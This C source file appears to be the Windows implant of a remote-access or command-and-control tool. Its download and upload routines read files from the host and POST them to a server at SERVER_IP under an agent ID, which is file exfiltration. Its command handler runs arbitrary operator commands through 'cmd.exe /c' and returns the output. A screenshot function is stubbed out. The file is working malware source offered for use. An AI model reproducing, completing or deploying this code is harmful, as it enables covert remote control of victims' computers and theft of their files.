#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <wincred.h>
#include <wininet.h>
#include "../include/commands.h"
#include "../include/network.h"

void download_file(const char *remote_path, const char *agent_id, char *output, size_t output_size) {
    // Open the file
    FILE *file = fopen(remote_path, "rb");
    if (!file) {
        snprintf(output, output_size, "[!] File not found: %s", remote_path);
        return;
    }

    // Get file size
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Allocate memory and read file
    char *file_data = malloc(file_size);
    if (!file_data) {
        fclose(file);
        snprintf(output, output_size, "[!] Memory error");
        return;
    }
    fread(file_data, 1, file_size, file);
    fclose(file);

    // Extract just the filename from the path
    const char *filename = remote_path;
    const char *last_slash = strrchr(remote_path, '\\');
    const char *last_fslash = strrchr(remote_path, '/');
    if (last_slash && (!last_fslash || last_slash > last_fslash))
        filename = last_slash + 1;
    else if (last_fslash)
        filename = last_fslash + 1;

    // Initialize WinINet with explicit online detection settings
    HINTERNET hInternet = InternetOpenA(
        USER_AGENT,
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, NULL,
        0
    );

    if (!hInternet) {
        DWORD error = GetLastError();
        free(file_data);
        snprintf(output, output_size, "[!] Failed to initialize WinINet: %lu", error);
        return;
    }

    // Set timeouts to be more lenient
    DWORD timeout = 30000; // 30 seconds
    InternetSetOptionA(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    // Connect to server
    HINTERNET hConnect = InternetConnectA(
        hInternet,
        SERVER_IP,
        SERVER_PORT,
        NULL, NULL,
        INTERNET_SERVICE_HTTP,
        0, 0
    );

    if (!hConnect) {
        DWORD error = GetLastError();
        InternetCloseHandle(hInternet);
        free(file_data);
        snprintf(output, output_size, "[!] Failed to connect to server: %lu", error);
        return;
    }

    // Create request path that just includes the filename
    char path_part[256];
    snprintf(path_part, sizeof(path_part), "/upload/%s/%s", agent_id, filename);

    // Create the HTTP request with more options
    HINTERNET hRequest = HttpOpenRequestA(
        hConnect,
        "POST",
        path_part,
        HTTP_VERSION,
        NULL,
        NULL,
        INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_AUTO_REDIRECT,
        0
    );

    if (!hRequest) {
        DWORD error = GetLastError();
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        free(file_data);
        snprintf(output, output_size, "[!] Failed to create request: %lu", error);
        return;
    }

    // Add necessary headers for binary data
    char headers[256];
    snprintf(headers, sizeof(headers),
             "Content-Type: application/octet-stream\r\n"
             "Content-Length: %ld\r\n"
             "Connection: Keep-Alive\r\n",
             file_size);

    HttpAddRequestHeadersA(hRequest, headers, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);

    // Send request with file data and handle retries
    BOOL success = FALSE;
    int retries = 3;
    DWORD error = 0;

    while (retries > 0 && !success) {
        success = HttpSendRequestA(hRequest, NULL, 0, file_data, file_size);
        if (!success) {
            error = GetLastError();
            // Only retry on connection errors
            if (error != ERROR_INTERNET_CONNECTION_ABORTED &&
                error != ERROR_INTERNET_CONNECTION_RESET &&
                error != ERROR_INTERNET_TIMEOUT) {
                break;
            }
            retries--;
            Sleep(1000); // Wait before retrying
        }
    }

    if (success) {
        // Check HTTP status code
        DWORD status_code = 0;
        DWORD buffer_size = sizeof(status_code);
        DWORD index = 0;

        if (HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                          &status_code, &buffer_size, &index) && status_code == 200) {
            snprintf(output, output_size, "[+] Downloaded: %s", filename);
        } else {
            snprintf(output, output_size, "[!] Server error: HTTP %lu", status_code);
        }
    } else {
        snprintf(output, output_size, "[!] Download failed with error: %lu", error);
    }

    // Clean up
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    free(file_data);
}

void upload_file(const char *local_path, const char *agent_id, char *output, size_t output_size) {
    // Open the file
    FILE *file = fopen(local_path, "rb");
    if (!file) {
        snprintf(output, output_size, "[!] File not found: %s", local_path);
        return;
    }

    // Get file size
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Allocate memory and read file
    char *file_data = malloc(file_size);
    if (!file_data) {
        fclose(file);
        snprintf(output, output_size, "[!] Memory allocation failed");
        return;
    }
    fread(file_data, 1, file_size, file);
    fclose(file);

    // Extract filename
    const char *filename = local_path;
    const char *last_slash = strrchr(local_path, '\\');
    const char *last_fslash = strrchr(local_path, '/');
    if (last_slash && (!last_fslash || last_slash > last_fslash))
        filename = last_slash + 1;
    else if (last_fslash)
        filename = last_fslash + 1;

    // Initialize WinINet
    HINTERNET hInternet = InternetOpenA(USER_AGENT, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        DWORD error = GetLastError();
        free(file_data);
        snprintf(output, output_size, "[!] InternetOpen failed: %lu", error);
        return;
    }

    // Set timeouts
    DWORD timeout = 30000;
    InternetSetOptionA(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOptionA(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    // Connect to the server
    HINTERNET hConnect = InternetConnectA(hInternet, SERVER_IP, SERVER_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        DWORD error = GetLastError();
        InternetCloseHandle(hInternet);
        free(file_data);
        snprintf(output, output_size, "[!] InternetConnect failed: %lu", error);
        return;
    }

    // Build the request path: e.g., /upload/agent123/filename.txt
    char path[256];
    snprintf(path, sizeof(path), "/upload/%s/%s", agent_id, filename);

    // Create HTTP request
    HINTERNET hRequest = HttpOpenRequestA(
        hConnect,
        "POST",
        path,
        HTTP_VERSION,
        NULL,
        NULL,
        INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_AUTO_REDIRECT,
        0
    );

    if (!hRequest) {
        DWORD error = GetLastError();
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        free(file_data);
        snprintf(output, output_size, "[!] HttpOpenRequest failed: %lu", error);
        return;
    }

    // Add headers
    char headers[256];
    snprintf(headers, sizeof(headers),
             "Content-Type: application/octet-stream\r\n"
             "Content-Length: %ld\r\n"
             "Connection: Keep-Alive\r\n",
             file_size);

    HttpAddRequestHeadersA(hRequest, headers, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);

    // Upload file
    BOOL success = FALSE;
    int retries = 3;
    DWORD error = 0;

    while (retries-- > 0 && !success) {
        success = HttpSendRequestA(hRequest, NULL, 0, file_data, file_size);
        if (!success) {
            error = GetLastError();
            if (error != ERROR_INTERNET_CONNECTION_ABORTED &&
                error != ERROR_INTERNET_CONNECTION_RESET &&
                error != ERROR_INTERNET_TIMEOUT) {
                break;
            }
            Sleep(1000);
        }
    }

    if (success) {
        DWORD status_code = 0;
        DWORD size = sizeof(status_code);
        DWORD index = 0;

        if (HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &status_code, &size, &index) && status_code == 200) {
            snprintf(output, output_size, "[+] Uploaded: %s", filename);
        } else {
            snprintf(output, output_size, "[!] Server responded with HTTP %lu", status_code);
        }
    } else {
        snprintf(output, output_size, "[!] Upload failed: %lu", error);
    }

    // Cleanup
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    free(file_data);
}

void execute_command(const char *command, char *output, size_t output_size, const char *agent_id) {

    if (strncmp(command, "download ", 9) == 0) {
        const char *remote_path = command + 9;
        download_file(remote_path, agent_id, output, output_size);
        return;
    }

    if (strncmp(command, "upload ", 9) == 0) {
        const char *remote_path = command + 9;
        upload_file(remote_path, agent_id, output, output_size);
        return;
    }

    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hRead, hWrite;
    CreatePipe(&hRead, &hWrite, &sa, 0);

    STARTUPINFO si = {sizeof(si)};
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    PROCESS_INFORMATION pi;
    char cmd_line[512];
    snprintf(cmd_line, sizeof(cmd_line), "cmd.exe /c %s", command);

    if (CreateProcess(NULL, cmd_line, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(hWrite);

        // Timeout: 30 seconds
        if (WaitForSingleObject(pi.hProcess, 30000) == WAIT_TIMEOUT) {
            TerminateProcess(pi.hProcess, 1);
            strncpy(output, "[ERROR] Command timed out (30s)", output_size);
        } else {
            DWORD bytes_read;
            char buffer[BUFFER_SIZE];
            while (ReadFile(hRead, buffer, sizeof(buffer)-1, &bytes_read, NULL) && bytes_read > 0) {
                buffer[bytes_read] = '\0';
                strncat(output, buffer, output_size - strlen(output) - 1);
            }
        }
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    CloseHandle(hRead);
}

void take_screenshot() {

}



